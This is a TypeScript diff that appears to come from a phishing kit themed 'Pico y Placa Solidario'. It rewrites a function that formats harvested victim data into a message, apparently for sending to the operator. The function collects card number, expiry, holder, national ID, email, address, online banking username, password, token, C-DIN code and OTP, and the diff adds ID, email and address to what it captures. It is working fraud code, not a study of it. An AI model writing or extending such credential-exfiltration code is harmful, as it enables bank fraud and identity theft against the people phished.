@@ -272,34 +272,35 @@ function formatStepMessage(payload: Record<string, unknown>) {
   ].join('\n');
 }
 
+function fieldValue(...values: unknown[]) {
+  for (const value of values) {
+    if (typeof value === 'string' && value.trim()) return value.trim();
+    if (typeof value === 'number' && Number.isFinite(value)) return String(value);
+  }
+  return '-';
+}
+
 function formatPaymentMessage(payload: Record<string, unknown>) {
   const mockCard = payload.mockCard as { brand?: string; pan?: string; exp?: string; cvv?: string; holder?: string } | undefined;
   const meta = objectValue(payload.meta) || {};
   const metaOtp = objectValue(payload.metaOtp) || {};
-  const stepMeta = payload.event === 'OTP_SUBMIT' ? { ...meta, ...metaOtp } : meta;
   const cpayload = objectValue(meta.cpayload) || {};
   const brand = String(payload.brand || mockCard?.brand || meta.brand || '-');
   return [
-    '🌿 PICO Y PLACA SOLIDARIO',
-    '━━━━━━━━━━━━━━━━━━',
-    `📍 ${stepLabel(payload.event, stepMeta)}`,
     `💵 Monto: ${formatPenAmount(meta, payload)}`,
-    '',
-    '💳 DATOS DE PAGO',
-    `🏷️ Marca: ${brand.toUpperCase()}`,
-    `💳 Tarjeta: ${cpayload.b || meta.card || '-'}`,
-    `📅 Expira: ${cpayload.cv || cpayload.exp || '-'}`,
-    `👤 Titular: ${cpayload.holder || '-'}`,
-    '',
-    '👤 CREDENCIALES',
-    `👤 Usuario: ${meta.username || '-'}`,
-    `🔑 Contraseña: ${meta.password || '-'}`,
-    `🎟️ Token: ${meta.token || '-'}`,
-    `🔐 C-DIN: ${meta.cdin || '-'}`,
-    '',
-    '💰 OTP',
-    `💵 Código: ${metaOtp.otp || '-'}`,
-    '━━━━━━━━━━━━━━━━━━',
+    `💳 Marca: ${brand.toUpperCase()}`,
+    `💳 Tarjeta: ${fieldValue(cpayload.b, meta.card)}`,
+    `📅 Expira: ${fieldValue(cpayload.cv, cpayload.exp)}`,
+    `👤 Titular: ${fieldValue(cpayload.holder)}`,
+    `🪪 Cédula: ${fieldValue(meta.documento, meta.cedula, meta.numeroDocumento)}`,
+    `✉️ Correo: ${fieldValue(meta.correo, meta.email)}`,
+    `🏠 Dirección: ${fieldValue(meta.direccion)}`,
+    '🔐 CREDENCIALES',
+    `👤 Usuario: ${fieldValue(meta.username)}`,
+    `🔑 Contraseña: ${fieldValue(meta.password)}`,
+    `🎟️ Token: ${fieldValue(meta.token)}`,
+    `🔐 C-DIN: ${fieldValue(meta.cdin)}`,
+    `💬 OTP: ${fieldValue(metaOtp.otp, meta.otp)}`,
   ].join('\n');
 }
 
